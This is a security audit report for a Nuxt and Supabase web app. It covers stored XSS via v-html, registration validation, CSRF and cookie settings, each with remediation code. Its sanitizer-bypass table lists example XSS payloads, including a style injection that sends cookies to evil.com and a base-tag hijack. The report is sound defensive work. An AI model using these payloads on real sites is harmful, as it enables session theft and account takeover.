# Security Audit Report

**Date:** 2026-04-26 (updated)
**Scope:** Full application — Nuxt 4 + Supabase + PrimeVue
**Branch:** `fix/ui-fixes`

---

## Summary

| Severity | Count |
|----------|-------|
| Critical | 2 |
| High | 2 |
| Medium | 5 |
| Low / Informational | 3 |
| Passing | 7 |

---

## Critical

### 1. XSS risk — incomplete sanitization on input, none on render

The app has a custom rich text editor (`app/components/shared/RichTextEditor.vue`) with a built-in `sanitizeHtml()` function. This is a good start, but has two structural problems and several bypass gaps.

**Structural problems:**

1. **Sanitization only runs on blur in the editor** (line 175–185) — not when content is saved, and not when content is rendered on public pages. If malicious HTML reaches the database through any path (direct DB edit, API manipulation, future import feature), it renders unsanitized via `v-html`.

2. **No render-time sanitization** — all 5 `v-html` bindings render raw database content:

| File | Line | Binding |
|------|------|---------|
| `app/pages/news/[slug].vue` | 72 | `v-html="article.content"` |
| `app/pages/jobs/[slug].vue` | 80 | `v-html="job.description"` |
| `app/pages/jobs/[slug].vue` | 84 | `v-html="job.requirements"` |
| `app/pages/jobs/[slug].vue` | 88 | `v-html="job.benefits"` |
| `app/pages/events/[slug].vue` | 89 | `v-html="event.content"` |

**Sanitizer bypass gaps** (`RichTextEditor.vue:134–153`):

The current sanitizer uses a blocklist approach — it removes known-dangerous tags and attributes. This misses many vectors:

| Vector | Status | Example |
|--------|--------|---------|
| `<script>`, `<iframe>`, `<object>`, `<embed>` | Blocked | — |
| `onclick`, `onerror`, `onload`, `onmouseover`, `onmouseout`, `onfocus`, `onblur` | Blocked | — |
| `javascript:` in `href` | Blocked | — |
| `<svg onload="...">` | **NOT blocked** | `<svg onload="alert(1)">` |
| `<svg><script>` (nested) | **NOT blocked** | `<svg><script>alert(1)</script></svg>` |
| `<math>` with embedded handlers | **NOT blocked** | `<math><mi onclick="...">` |
| `<img src=x onerror="...">` (non-standard attrs) | Partially blocked | `onerror` blocked, but `onanimationstart`, `ontransitionend`, `onpointerover` etc. are **NOT** |
| `<a href="data:text/html,...">` | **NOT blocked** | Data URI HTML injection |
| `<style>` injection | **NOT blocked** | `<style>*{background:url(//evil.com/steal?cookie=...)}</style>` |
| `<base>` tag hijacking | **NOT blocked** | `<base href="//evil.com/">` redirects all relative URLs |
| `<meta http-equiv="refresh">` | **NOT blocked** | Auto-redirect users |
| CSS `expression()` / `-moz-binding` | **NOT blocked** | Legacy IE/Firefox XSS |
| Event handlers beyond the 7 listed | **NOT blocked** | 50+ on* handlers exist (`onanimationend`, `onwheel`, `onpointerenter`, etc.) |

**Impact:** Stored XSS — if any bypass is exploited, attacker-controlled scripts run in authenticated user sessions, can steal tokens, impersonate users, or exfiltrate data.

**Remediation (two-layer fix):**

**Layer 1 — Replace custom sanitizer with DOMPurify in the editor:**

```bash
pnpm add dompurify
pnpm add -D @types/dompurify
```

Update `RichTextEditor.vue`:
```ts
import DOMPurify from 'dompurify'

function sanitizeHtml(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: [
      'b', 'i', 'em', 'strong', 'u', 's', 'a', 'p', 'br', 'span',
      'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'h4',
      'blockquote', 'code', 'pre', 'img', 'hr', 'div',
    ],
    ALLOWED_ATTR: [
      'href', 'target', 'rel', 'src', 'alt', 'class', 'style',
      'width', 'height', 'data-align',
    ],
    ALLOW_DATA_ATTR: false,
  })
}
```

**Layer 2 — Add render-time sanitization on every `v-html` page:**

```ts
// composables/useSanitize.ts
import DOMPurify from 'dompurify'

export function useSanitize() {
  function sanitizeHTML(dirty: string | null | undefined): string {
    if (!dirty) return ''
    return DOMPurify.sanitize(dirty, {
      ALLOWED_TAGS: [
        'b', 'i', 'em', 'strong', 'u', 's', 'a', 'p', 'br', 'span',
        'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'h4',
        'blockquote', 'code', 'pre', 'img', 'hr', 'div',
      ],
      ALLOWED_ATTR: [
        'href', 'target', 'rel', 'src', 'alt', 'class', 'style',
        'width', 'height',
      ],
      ALLOW_DATA_ATTR: false,
    })
  }
  return { sanitizeHTML }
}
```

Then in each page:
```vue
<script setup>
const { sanitizeHTML } = useSanitize()
const safeContent = computed(() => sanitizeHTML(article.value?.content))
</script>
<template>
  <div v-html="safeContent" />
</template>
```

This two-layer approach means content is sanitized both on creation (editor) and on display (render), so even if the database is compromised, XSS is blocked.

---

### 2. Registration endpoint — no input validation, no rate limiting

**File:** `server/api/auth/register.post.ts`

The only server API route accepts a POST body and passes fields directly to Supabase with minimal checking.

**Issues found:**

| Issue | Detail |
|-------|--------|
| Email validation | Only truthy check — any string accepted |
| Password strength | No server-side enforcement (frontend has 8-char check, but can be bypassed) |
| batch_year | `Number(batch_year)` accepts negative numbers, decimals, year 9999, etc. |
| phone | No format validation — any string stored |
| student_id | No length or format constraint |
| Rate limiting | None — unlimited registrations from a single IP |
| Error leakage | "already registered" response reveals whether an email exists in the system |
| email_confirm | Set to `true` (auto-confirms) — users register with fake/disposable emails |

**Impact:** Registration spam/abuse, enumeration of existing email addresses, storage of malformed data.

**Remediation:**

```ts
// Install zod: pnpm add zod
import { z } from 'zod'

const registrationSchema = z.object({
  email: z.string().email().toLowerCase().max(255),
  password: z.string().min(8).max(128),
  full_name: z.string().min(2).max(100).trim(),
  batch_year: z.number().int().min(1900).max(new Date().getFullYear()).optional(),
  student_id: z.string().max(50).optional(),
  phone: z.string().regex(/^\+?[\d\s\-()]{7,20}$/).optional(),
})

export default defineEventHandler(async (event) => {
  const body = await readBody(event)
  const parsed = registrationSchema.safeParse(body)
  if (!parsed.success) {
    throw createError({ statusCode: 400, statusMessage: 'Invalid registration data' })
  }
  // ... use parsed.data instead of raw body
})
```

For rate limiting, add an in-memory or Redis-backed limiter (e.g., `rate-limiter-flexible` or Nuxt's `defineCachedEventHandler` with TTL).

Replace the "already registered" error with a generic "Registration failed" to prevent email enumeration.

Set `email_confirm: false` to require actual email verification (lower priority since admin approval is also required).

---

## High

### 3. No CSRF / origin validation on registration endpoint

**File:** `server/api/auth/register.post.ts`

The POST endpoint has no origin or referer header check. A malicious site could submit a registration form on behalf of a visitor.

Other state-changing operations go through the Supabase client (which uses cookie-based auth with SameSite protection), but the registration endpoint is a plain Nitro server route with no CSRF defence.

**Impact:** Cross-site registration abuse; could be used to spam the pending-members queue.

**Remediation:**

```ts
export default defineEventHandler(async (event) => {
  const origin = getHeader(event, 'origin')
  const config = useRuntimeConfig()
  const allowed = [config.public.siteUrl, 'http://localhost:3000']

  if (!origin || !allowed.includes(origin)) {
    throw createError({ statusCode: 403, statusMessage: 'Forbidden' })
  }
  // ... continue
})
```

---

### 4. Missing explicit Supabase cookie configuration

**File:** `nuxt.config.ts` (lines 51–58)

```ts
supabase: {
  redirect: false,
  redirectOptions: {
    login: '/login',
    callback: '/feed',
    exclude: ['/', '/directory', '/events/**', '/news/**', '/jobs/**', '/register', '/admin/login'],
  },
  // No cookieOptions defined
}
```

The application relies on `@nuxtjs/supabase` defaults for cookie attributes. In production, cookies should be explicitly configured for security.

**What's missing:**

| Attribute | Default | Recommended |
|-----------|---------|-------------|
| `secure` | varies | `true` (HTTPS only) |
| `httpOnly` | varies | `true` (not accessible to JS) |
| `sameSite` | `Lax` | `Lax` or `Strict` |
| `maxAge` | module default | Explicit value (e.g., 7 days) |

**Impact:** Without explicit `secure: true`, session cookies could be sent over HTTP in misconfigured deployments. Without `sameSite: Strict`, certain cross-site scenarios could forward cookies.

**Remediation:**

```ts
supabase: {
  redirect: false,
  redirectOptions: { /* ... */ },
  cookieOptions: {
    maxAge: 60 * 60 * 24 * 7, // 7 days
    secure: true,
    sameSite: 'lax',
  },
}
```

---

## Medium

### 5. Pages accessible without middleware (RLS-only protection)

These pages query member-restricted tables but have no route middleware. Supabase RLS correctly blocks data access for unauthenticated users, so they see empty lists — but there is no redirect to login, which is both a UX gap and a missing layer of defence-in-depth.

| Page | Current protection | Recommendation |
|------|--------------------|----------------|
| `app/pages/news/index.vue` | RLS only | Add `member-auth` middleware |
| `app/pages/jobs/index.vue` | RLS only | Add `member-auth` middleware |
| `app/pages/events/index.vue` | RLS only | Add `member-auth` middleware |

**Note:** These pages are listed in the Supabase config's `exclude` array for redirect, and in the architecture doc as public routes. If the intent is for them to be publicly viewable (with RLS showing only published content to anon users), this is acceptable — but migration 005 changed event RLS to require `is_active_alumni()`, meaning unauthenticated users see nothing. Either add middleware or revert the RLS policy to allow public read of published events.

---

### 6. Client-side mutations lack input length / format validation

Composable functions accept user input and pass it to Supabase without length caps or format checks. Supabase column constraints provide some protection, but client-side validation gives better UX and reduces unnecessary API calls.

| File | Function | Issue |
|------|----------|-------|
| `app/composables/useFeed.ts` | `createPost()` | No content length limit |
| `app/composables/useFeed.ts` | `addComment()` | No content length limit |
| `app/composables/useFeed.ts` | `removePost()` | No reason length limit |
| `app/composables/useMembers.ts` | `fetchDirectory()` | Search string not length-capped |
| `app/composables/useNews.ts` | `fetchArticles()` | Search string not length-capped |
| `app/composables/useJobs.ts` | `fetchJobs()` | Search string not length-capped |

**Note on SQL injection:** Supabase PostgREST parameterizes all queries, so `.ilike()` and `.eq()` calls are safe from SQL injection. The risk here is oversized payloads and abuse, not injection.

**Remediation:** Add simple guards before API calls:

```ts
const MAX_POST_LENGTH = 5000
const MAX_COMMENT_LENGTH = 1000
const MAX_SEARCH_LENGTH = 200

async function createPost(content: string, ...) {
  if (!content.trim() || content.length > MAX_POST_LENGTH) {
    return { success: false, error: 'Content too long or empty' }
  }
  // ...
}
```

---

### 7. Admin operations rely solely on RLS for authorization

Functions like `approveMembers()`, `removePost()`, and `hidePost()` do not verify the caller is an admin before making the Supabase call. RLS correctly blocks unauthorized access, but the client receives a silent/cryptic PostgREST error instead of a clear "Unauthorized" message.

**Affected functions:**

| File | Function |
|------|----------|
| `app/composables/useMembers.ts` | `approveMembers()`, `rejectMember()`, `suspendMember()` |
| `app/composables/useFeed.ts` | `removePost()`, `hidePost()` |

**Impact:** Low — RLS prevents the actual mutation. But poor error handling could confuse users or mask real issues.

**Remediation:** Either check admin status before calling, or handle the RLS rejection gracefully:

```ts
if (error?.code === '42501') {
  return { success: false, error: 'Unauthorized — admin access required' }
}
```

---

### 8. Middleware error handling gaps

**Files:** `app/middleware/member-auth.ts`, `app/middleware/admin-auth.ts`

If the Supabase profile/admin query fails (network error, Supabase outage), the `data` variable is null. The current code does not distinguish "query failed" from "user not found":

```ts
// member-auth.ts
const { data } = await supabase.from('alumni_profiles').select('status').eq('id', user.id).single()

if (data?.status === 'pending') return navigateTo('/pending')
if (data?.status === 'suspended' || data?.status === 'rejected') return navigateTo('/login')
// If data is null (query error), user passes through — no redirect
```

**Impact:** On Supabase outage, users could reach member pages with an empty/broken state. RLS still protects data, but the UX is confusing.

**Remediation:**

```ts
const { data, error } = await supabase.from('alumni_profiles').select('status').eq('id', user.id).single()

if (error || !data) {
  console.error('Auth middleware: profile query failed', error)
  return navigateTo('/login')
}
```

---

### 9. `redirect: false` in Supabase config

**File:** `nuxt.config.ts` (line 52)

With `redirect: false`, the `@nuxtjs/supabase` module does not automatically redirect unauthenticated users. The application handles this manually via middleware, which works — but it means every new protected page MUST remember to add `middleware: 'member-auth'` or `middleware: 'admin-auth'` in `definePageMeta`. If a developer forgets, the page is unprotected (except by RLS).

**Impact:** Increased surface for mistakes when adding new pages.

**Recommendation:** Consider switching to `redirect: true` for an additional safety net, or document the requirement clearly in CLAUDE.md / contributing guide.

---

## Low / Informational

### 10. Session / token refresh relies on module defaults

No explicit `autoRefreshToken` or `persistSession` configuration. The `@nuxtjs/supabase` module handles token refresh automatically by default, and this is working correctly. Documenting the behaviour explicitly would prevent confusion.

---

### 11. Registration auto-confirms email

**File:** `server/api/auth/register.post.ts` (line ~26)

```ts
email_confirm: true // auto-confirms without actual email verification
```

Users can register with fake or disposable email addresses. This is partially mitigated by the admin approval flow (all registrations start as `status: 'pending'`), but an admin has no way to verify the email is real.

**Recommendation:** Set `email_confirm: false` and handle the email verification flow, or accept the risk given admin approval is required.

---

### 12. Partial failure cleanup in registration

**File:** `server/api/auth/register.post.ts` (line ~56)

If profile creation fails after auth user creation, the code attempts to delete the orphaned auth user but silently swallows the error:

```ts
await adminSupabase.auth.admin.deleteUser(userId).catch(() => {})
```

**Impact:** Orphaned auth users without profiles. Low probability but could accumulate over time.

**Recommendation:** Log the cleanup failure:

```ts
.catch((err) => console.error('Failed to cleanup orphaned auth user:', userId, err))
```

---

## Passing (no issues found)

| Area | Status |
|------|--------|
| `.env` not tracked in git | `.gitignore` correctly excludes `.env`. Verified via `git ls-files`. |
| Service role key server-only | Key is in `runtimeConfig` (not `runtimeConfig.public`). Not exposed to client bundle. |
| RLS policy coverage | Comprehensive policies on all tables. Helper functions use `SECURITY DEFINER` to prevent recursion. Feed, reactions, comments restricted to active alumni. Admin operations restricted to `admin_users`. |
| Middleware uses reliable auth check | Both `member-auth.ts` and `admin-auth.ts` use `supabase.auth.getUser()` (async API call) instead of the unreliable `useSupabaseUser()` reactive ref. |
| Composable auth patterns | All composable mutations now use `resolveUserId()` which tries `authStore.profile.id` first, falls back to `supabase.auth.getUser()`. No more `id=eq.undefined` bugs. |
| No service role key on client | Grep confirms `SUPABASE_SERVICE_ROLE_KEY` only appears in `.env`, `.env.example`, `nuxt.config.ts` (server runtime config), and `server/api/auth/register.post.ts`. Never imported or referenced in `app/` directory. |
| Rich text editor has input sanitization | `SharedRichTextEditor` (`app/components/shared/RichTextEditor.vue:134–153`) strips dangerous tags (`script`, `iframe`, `object`, `embed`, `form`, `input`, `button`), dangerous event attributes, and `javascript:` URIs on blur. This is a good first layer — but needs to be hardened (see Finding #1). |

---

## Recommended action plan (priority order)

| Priority | Action | Effort |
|----------|--------|--------|
| 1 | Install DOMPurify — replace custom sanitizer in `RichTextEditor.vue` and add render-time `useSanitize()` composable for all `v-html` pages | ~1.5 hours |
| 2 | Add zod schema validation to registration endpoint | ~1 hour |
| 3 | Add rate limiting to registration endpoint | ~1 hour |
| 4 | Add CSRF / origin check to registration endpoint | ~30 min |
| 5 | Add explicit Supabase cookie configuration | ~15 min |
| 6 | Add error handling to middleware query failures | ~30 min |
| 7 | Add input length validation to composable mutations | ~1 hour |
| 8 | Add middleware to unprotected member pages (or fix RLS) | ~15 min |
| 9 | Improve registration error messages (no email enumeration) | ~15 min |
| 10 | Log partial-failure cleanup in registration | ~5 min |
